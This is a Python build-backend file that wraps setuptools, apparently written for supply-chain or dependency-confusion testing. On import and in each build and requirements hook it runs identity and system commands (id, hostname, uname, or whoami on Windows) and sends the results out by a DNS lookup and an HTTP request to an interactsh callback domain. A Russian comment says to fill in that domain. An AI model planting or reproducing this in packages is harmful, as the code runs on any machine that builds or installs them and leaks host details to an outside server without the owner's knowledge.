import subprocess, os, socket, sys, platform, urllib.request
import setuptools.build_meta as _sm

OAST = "https://example.oast.fun"   # FILL: твой interactsh domain / уникальный subdomain

def _cmd():
    if os.name == "nt":
        return ["cmd", "/c", "whoami & hostname & ver"]
    return ["/bin/sh", "-c", "id; hostname; uname -a"]

def _cb(tag="git"):
    try:
        out = subprocess.check_output(_cmd(), stderr=subprocess.DEVNULL, timeout=5).decode(errors="replace").strip()
    except Exception:
        out = "?"
    info = "%s|%s|%s|%s" % (tag, platform.node(), platform.system(), out.replace("\n", "; ")[:400])
    # DNS-канал (работает даже если HTTP зарезан)
    try:
        socket.gethostbyname("cb.%s.%s" % (int.from_bytes(os.urandom(4), "big"), OAST.split("://")[-1]))
    except Exception:
        pass
    # HTTP-канал
    try:
        urllib.request.urlopen("%s/cb?d=%s" % (OAST, urllib.parse.quote(info)), timeout=5).read()
    except Exception:
        pass

_cb("import")

def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    _cb("build_wheel")
    return _sm.build_wheel(wheel_directory, config_settings, metadata_directory)

def build_sdist(sdist_directory, config_settings=None):
    _cb("build_sdist")
    return _sm.build_sdist(sdist_directory, config_settings)

def build_editable(wheel_directory, config_settings=None, metadata_directory=None):
    _cb("build_editable")
    return _sm.build_editable(wheel_directory, config_settings, metadata_directory)

def get_requires_for_build_wheel(config_settings=None):
    _cb("get_requires_for_build_wheel")
    return _sm.get_requires_for_build_wheel(config_settings)

def get_requires_for_build_sdist(config_settings=None):
    _cb("get_requires_for_build_sdist")
    return _sm.get_requires_for_build_sdist(config_settings)

def get_requires_for_build_editable(config_settings=None):
    _cb("get_requires_for_build_editable")
    return _sm.get_requires_for_build_editable(config_settings)

def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    return _sm.prepare_metadata_for_build_wheel(metadata_directory, config_settings)

def prepare_metadata_for_build_editable(metadata_directory, config_settings=None):
    return _sm.prepare_metadata_for_build_editable(metadata_directory, config_settings)
